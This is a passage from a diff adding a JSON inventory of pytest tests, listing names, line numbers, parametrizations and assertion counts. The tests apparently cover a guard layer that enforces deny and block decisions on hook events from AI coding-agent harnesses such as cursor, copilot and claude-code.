+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_kimi_hook_payload_creates_action_envelope",
+    "line": 361,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_normalize_hook_payload_leaves_other_harnesses_untouched",
+    "line": 375,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_normalize_kimi_prompt_preserves_non_text_payloads",
+    "line": 384,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_runtime_delivery_contract.py",
+    "name": "test_unavailability_warns_without_creating_native_success",
+    "line": 44,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('recording_only', [False, True], ids=['enforce', 'watch'])",
+      "pytest.mark.parametrize('harness', ['claude-code', 'grok', 'cursor'])",
+      "pytest.mark.parametrize('reason_code', ['native_policy_not_ready', 'native_hook_edge_invalid_response', 'native_command_control_fence_unavailable', 'daemon_hook_deadline_exhausted'])"
+    ],
+    "assertion_count": 10,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_runtime_delivery_contract.py",
+    "name": "test_integrity_rejection_still_denies_in_both_postures",
+    "line": 78,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('recording_only', [False, True], ids=['enforce', 'watch'])",
+      "pytest.mark.parametrize('harness,decision', [('claude-code', 'deny'), ('hermes', 'block'), ('pi', 'deny')])",
+      "pytest.mark.parametrize('reason_code', ['invalid_hook_payload_reference', 'daemon_hook_queue_bytes'])"
+    ],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_runtime_delivery_contract.py",
+    "name": "test_posttool_unavailability_and_completed_block_are_different",
+    "line": 98,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('harness', ['claude-code', 'grok', 'pi'])"
+    ],
+    "assertion_count": 7,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_runtime_delivery_contract.py",
+    "name": "test_permission_availability_does_not_invent_an_approval",
+    "line": 128,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('harness', ['copilot', 'claude-code', 'hermes', 'pi'])"
+    ],
+    "assertion_count": 8,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_runtime_delivery_contract.py",
+    "name": "test_cursor_unavailable_and_malformed_input_keep_distinct_contracts",
+    "line": 150,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('event', ['beforeShellExecution', 'beforeMCPExecution'])"
+    ],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_runtime_delivery_contract.py",
+    "name": "test_watch_copy_does_not_rewrite_the_native_block",
+    "line": 160,
+    "declared_parametrization": [],
+    "assertion_count": 9,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_launcher_input.py",
+    "name": "test_exact_four_inputs_and_independent_stdout_contracts",
+    "line": 108,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('harness', ['codex', 'claude-code'])",
+      "pytest.mark.parametrize('event', ['PreToolUse', 'PostToolUse'])"
+    ],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_launcher_input.py",
+    "name": "test_normalized_empty_post_registration_is_native_pretool_review",
+    "line": 127,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('kind', ['nonobject_json', 'empty'])"
+    ],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_launcher_input.py",
+    "name": "test_oversize_codex_post_retains_existing_pretool_denial",
+    "line": 140,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_launcher_input.py",
+    "name": "test_false_success_and_review_identity_mutations_fail",
+    "line": 150,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('mutation', ['allow', 'wrong_id', 'remote_url', 'extra_specific', 'numeric_continue'])"
+    ],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_launcher_input.py",
+    "name": "test_all_sixteen_cases_execute_exact_registered_processes",
+    "line": 257,
+    "declared_parametrization": [],
+    "assertion_count": 8,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_launcher_input.py",
+    "name": "test_input_route_failure_retains_actual_case_counters_without_observer_retry",
+    "line": 277,
+    "declared_parametrization": [],
+    "assertion_count": 14,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_launcher_input.py",
+    "name": "test_failure_preserves_prior_success_and_failed_exit",
+    "line": 322,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_launcher_input.py",
+    "name": "test_live_block_resolution_never_accepts_allow",
+    "line": 332,
+    "declared_parametrization": [],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_launcher_input.py",
+    "name": "test_rejected_inputs_cannot_hide_native_work",
+    "line": 340,
+    "declared_parametrization": [],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_launcher_input.py",
+    "name": "test_zero_exit_cannot_hide_process_failure",
+    "line": 349,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('flag', ['timed_out', 'containment_failed', 'output_limit_exceeded'])"
+    ],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_launcher_input.py",
+    "name": "test_changed_registration_fails_and_prevents_further_forwarding",
+    "line": 368,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('read_number', [1, 2])"
+    ],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_launcher_input.py",
+    "name": "test_failed_resolution_cannot_be_reported_as_valid_review",
+    "line": 388,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_real_adapters_install_and_read_actual_configurations",
+    "line": 93,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('harness,count', (('copilot', 4), ('kimi', 2), ('grok', 1), ('zcode', 1)))"
+    ],
+    "assertion_count": 10,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_cursor_reads_all_six_exact_aliases_and_worker_digest",
+    "line": 116,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_cursor_rejects_ambiguous_or_changed_registration",
+    "line": 128,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('fault', ('duplicate', 'disabled', 'wrong_event', 'wrong_fail_closed', 'shell'))"
+    ],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_cline_reads_canonical_slots_and_both_artifact_digests",
+    "line": 147,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_cline_rejects_inactive_or_redirected_slots",
+    "line": 158,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('fault', ('inactive', 'path'))"
+    ],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_cline_custom_guard_home_is_explicitly_unavailable_before_install",
+    "line": 172,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_ambient_home_override_cannot_redirect_install",
+    "line": 179,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_windows_parser_uses_os_abi_and_lossless_roundtrip",
+    "line": 188,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_real_windows_command_line_abi_roundtrip",
+    "line": 206,
+    "declared_parametrization": [
+      "pytest.mark.skipif(os.name != 'nt', reason='real Win32 CommandLineToArgvW qualification')"
+    ],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_zcode_windows_comment_is_not_silently_removed",
+    "line": 211,
+    "declared_parametrization": [],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_configuration_limit",
+    "line": 217,
+    "declared_parametrization": [],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_each_registered_alias_has_frozen_normal_cases",
+    "line": 238,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_review_and_observation_delivery_cannot_be_called_allow_or_output_block",
+    "line": 265,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('case_id,decision,code', (('cursor/beforeReadFile/normal/small', 'deny', 2), ('cursor/beforeWriteFile/normal/small', 'ask', 0), ('cursor/beforeMCPExecution/normal/small', 'ask', 0), ('cursor/afterShellExecution/block/1k', 'observation_only', 0), ('cline/PostToolUse/block/1k', 'observation_only', 0)))"
+    ],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_copilot_daemon_envelope_does_not_satisfy_installed_native_stdout",
+    "line": 277,
+    "declared_parametrization": [],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_actual_process_runs_read_back_cursor_script",
+    "line": 304,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_bounded_process_failures_never_become_samples",
+    "line": 334,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('failure', ('timed_out', 'containment_failed', 'output_limit_exceeded'))"
+    ],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_remaining_surfaces_do_not_claim_managed_json_is_host_activation",
+    "line": 355,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_runner_requires_native_witness_and_reports_observation_only",
+    "line": 365,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('route', ('native_resident', 'legacy'))"
+    ],
+    "assertion_count": 19,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_native_slo_registered_surfaces.py",
+    "name": "test_runner_keeps_unavailable_path_visible",
+    "line": 440,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_pi_extension_response_contract.py",
+    "name": "test_canonical_omp_allow_deny_and_lifecycle_shapes",
+    "line": 613,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_pi_extension_response_contract.py",
+    "name": "test_generated_omp_rejects_ambiguous_success_and_preserves_retry_semantics",
+    "line": 642,
+    "declared_parametrization": [],
+    "assertion_count": 46,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_pi_extension_response_contract.py",
+    "name": "test_generated_omp_tool_result_preserves_daemon_allow_without_hash",
+    "line": 732,
+    "declared_parametrization": [],
+    "assertion_count": 9,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_pi_extension_response_contract.py",
+    "name": "test_generated_omp_payload_matches_real_python_review",
+    "line": 746,
+    "declared_parametrization": [],
+    "assertion_count": 12,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_pi_extension_response_contract.py",
+    "name": "test_generated_unicode_source_ref_matches_python_fast_path",
+    "line": 824,
+    "declared_parametrization": [],
+    "assertion_count": 11,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_pi_extension_response_contract.py",
+    "name": "test_generated_large_non_source_result_returns_reviewed_excerpt",
+    "line": 910,
+    "declared_parametrization": [],
+    "assertion_count": 10,
+    "static_only": true
+  }
+]
